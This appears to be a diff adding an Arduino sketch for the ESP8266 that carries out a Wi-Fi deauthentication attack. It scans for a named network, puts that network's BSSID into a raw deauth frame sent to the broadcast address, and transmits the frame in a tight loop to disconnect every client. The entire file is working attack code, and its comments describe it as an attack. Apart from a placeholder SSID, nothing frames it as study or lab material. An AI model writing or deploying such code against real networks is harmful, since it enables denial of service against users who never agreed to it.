@@ -1,0 +1,73 @@
+
+#include <ESP8266WiFi.h>
+extern "C" {
+  #include "user_interface.h"
+}
+
+// Variables to store target network information
+String targetSSID = "Test_AP"; // Replace with the network name you want to deauth
+uint8_t targetMAC[6];
+bool targetFound = false;
+
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00,                         // Frame Control: deauth frame
+  0x3A, 0x01,                         // Duration
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast address (disconnects all clients)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (to be replaced with target MAC)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (to be replaced with target MAC)
+  0x00, 0x00,                         // Fragment & sequence number
+  0x07, 0x00                          // Reason code: 0x07 (Class 3 frame received from nonassociated STA)
+};
+
+void setup() {
+  Serial.begin(115200);
+  WiFi.mode(WIFI_STA); // Set ESP8266 to station mode for scanning
+
+  // Start Wi-Fi scan
+  int n = WiFi.scanNetworks();
+  Serial.println("Scanning for networks...");
+  for (int i = 0; i < n; ++i) {
+    String ssid = WiFi.SSID(i);
+    if (ssid == targetSSID) {
+      Serial.println("Target network found: " + ssid);
+
+      // Copy MAC address of the found network
+      WiFi.BSSID(i); // Get BSSID directly (returns a pointer)
+      memcpy(targetMAC, WiFi.BSSID(i), 6); // Copy the MAC address into our array
+
+      Serial.print("Target MAC: ");
+      for (int j = 0; j < 6; j++) {
+        deauthPacket[10 + j] = targetMAC[j]; // Set source MAC in packet
+        deauthPacket[16 + j] = targetMAC[j]; // Set BSSID in packet
+        Serial.printf("%02X", targetMAC[j]);
+        if (j < 5) Serial.print(":");
+      }
+      Serial.println();
+      targetFound = true;
+      break;
+    }
+  }
+
+  if (!targetFound) {
+    Serial.println("Target network not found. Restarting...");
+    ESP.restart(); // Restart if target not found
+  } else {
+    wifi_set_channel(WiFi.channel()); // Set ESP8266 to target AP’s channel
+  }
+}
+
+void sendDeauth() {
+  if (targetFound) {
+    Serial.print("Sending deauth packet: ");
+    Serial.println(wifi_send_pkt_freedom(deauthPacket, 26, 0));
+    delay(1); // Short delay to prevent overloading
+  }
+}
+
+
+void loop() {
+  if (targetFound) {
+    sendDeauth();
+    delay(1); // Adjust delay to control attack frequency
+  }
+}
